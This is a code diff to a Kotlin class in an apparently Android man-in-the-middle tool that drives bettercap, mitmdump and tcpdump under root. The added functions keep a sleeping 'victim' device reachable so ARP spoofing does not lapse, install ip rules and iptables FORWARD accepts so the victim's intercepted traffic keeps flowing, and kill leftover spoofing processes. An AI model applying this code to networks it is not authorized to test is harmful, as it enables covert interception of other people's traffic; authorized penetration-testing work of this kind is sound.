@@ -179,6 +179,81 @@ class MitmRuntimeController(
         return result.exitCode == 0 && !result.timedOut
     }
 
+    fun buildKeepaliveScript(targetHost: String): String {
+        // Keep power-saving Wi-Fi targets (e.g. a phone with the screen off) resolved in bettercap's
+        // LAN table. Once the target stops answering, bettercap drops it and arp.spoof logs
+        // "could not find spoof targets" and stops poisoning, so the capture silently goes dead until
+        // the target wakes again. A steady low-rate probe both refreshes the neighbor entry and nudges
+        // the target to stay reachable, which is the difference between "sometimes works" and "works".
+        return "while true; do ${shellCommandToken("ping")} -n -c 1 -W 2 ${shellQuote(targetHost)} >/dev/null 2>&1; sleep 1; done\n"
+    }
+
+    fun sweepStaleProcesses() {
+        // Kill leaked bettercap/mitmdump/tcpdump from a prior session whose working directory was
+        // deleted -- the classic leak where the app process died without running cleanup, or another
+        // package variant's data was cleared, leaving an orphan still poisoning ARP on the same
+        // interface and fighting the new session. Matching on a "(deleted)" cwd is precise: a live
+        // session's cwd still exists on disk, so this never touches a healthy session.
+        // One `ls -l` over every /proc/<pid>/cwd resolves all symlink targets in a single process
+        // (~50ms on a 1000-process device). The earlier per-pid `readlink` loop forked once per
+        // process, ran for seconds under su, and tripped the shell timeout. Each matching line looks
+        // like "... /proc/13513/cwd -> /data/.../session-x (deleted)"; pull the pid back out and kill.
+        shellRepository.execute(
+            command = buildString {
+                append("ls -l /proc/[0-9]*/cwd 2>/dev/null | while IFS= read -r line; do\n")
+                append("  case \"${'$'}line\" in\n")
+                append("    *fsploit*\"(deleted)\"|*\"/files/mitm/\"*\"(deleted)\")")
+                append(" pid=${'$'}{line#*/proc/}; pid=${'$'}{pid%%/*};")
+                append(" case \"${'$'}pid\" in [0-9]*) kill -9 \"${'$'}pid\" 2>/dev/null || true;; esac;;\n")
+                append("  esac\n")
+                append("done\n")
+            },
+            asRoot = true,
+            timeoutMs = FIREWALL_TIMEOUT_MS
+        )
+    }
+
+    fun applyVictimForwarding(targetHost: String, interfaceName: String): Boolean {
+        val host = shellQuote(targetHost)
+        val iface = shellQuote(interfaceName)
+        val result = shellRepository.execute(
+            command = buildString {
+                // Route the victim's off-subnet (internet-bound) forwarded packets through the
+                // interface's own routing table, which holds the real default route. Android's main
+                // table has no default for forwarded packets, so without this they fall through to the
+                // kernel's "unreachable" rule and the victim is answered with ICMP net unreachable --
+                // its connections die and the sniff sees only stray broadcasts. Clear any stale copy
+                // first so repeated launches do not stack duplicate rules.
+                append("while ip rule del iif $iface from $host lookup $iface priority $VICTIM_FORWARD_RULE_PRIORITY 2>/dev/null; do :; done\n")
+                append("while ip rule del iif $iface to $host lookup $iface priority $VICTIM_FORWARD_RULE_PRIORITY 2>/dev/null; do :; done\n")
+                append("ip rule add iif $iface from $host lookup $iface priority $VICTIM_FORWARD_RULE_PRIORITY\n")
+                append("ip rule add iif $iface to $host lookup $iface priority $VICTIM_FORWARD_RULE_PRIORITY\n")
+                // Accept the victim's forwarded traffic ahead of Android's tetherctrl_FORWARD chain,
+                // which ends in an unconditional DROP for any non-tethered forwarded packet.
+                append("iptables -C FORWARD -s $host -j ACCEPT 2>/dev/null || iptables -I FORWARD -s $host -j ACCEPT\n")
+                append("iptables -C FORWARD -d $host -j ACCEPT 2>/dev/null || iptables -I FORWARD -d $host -j ACCEPT\n")
+            },
+            asRoot = true,
+            timeoutMs = FIREWALL_TIMEOUT_MS
+        )
+        return result.exitCode == 0 && !result.timedOut
+    }
+
+    fun clearVictimForwarding(targetHost: String, interfaceName: String) {
+        val host = shellQuote(targetHost)
+        val iface = shellQuote(interfaceName)
+        shellRepository.execute(
+            command = buildString {
+                append("while ip rule del iif $iface from $host lookup $iface priority $VICTIM_FORWARD_RULE_PRIORITY 2>/dev/null; do :; done\n")
+                append("while ip rule del iif $iface to $host lookup $iface priority $VICTIM_FORWARD_RULE_PRIORITY 2>/dev/null; do :; done\n")
+                append("while iptables -D FORWARD -s $host -j ACCEPT 2>/dev/null; do :; done\n")
+                append("while iptables -D FORWARD -d $host -j ACCEPT 2>/dev/null; do :; done\n")
+            },
+            asRoot = true,
+            timeoutMs = FIREWALL_TIMEOUT_MS
+        )
+    }
+
     fun buildTcpdumpScript(
         config: MitmToolchainConfig,
         interfaceName: String,
@@ -323,6 +398,10 @@ class MitmRuntimeController(
     companion object {
         private const val PROBE_TIMEOUT_MS = 2000L
         private const val FIREWALL_TIMEOUT_MS = 4000L
+
+        // Sits just above Android's catch-all "unreachable" rule (priority 32000) and below the
+        // device's own marked-socket routing rules, so it only steers the victim's forwarded packets.
+        private const val VICTIM_FORWARD_RULE_PRIORITY = 18500
         private const val BETTERCAP_RUNTIME_DIRECTORY_PREFIX = "/data/local/tmp/fsploit-bettercap"
         private const val MITMDUMP_RUNTIME_DIRECTORY_PREFIX = "/data/local/tmp/fsploit-mitmdump"
     }
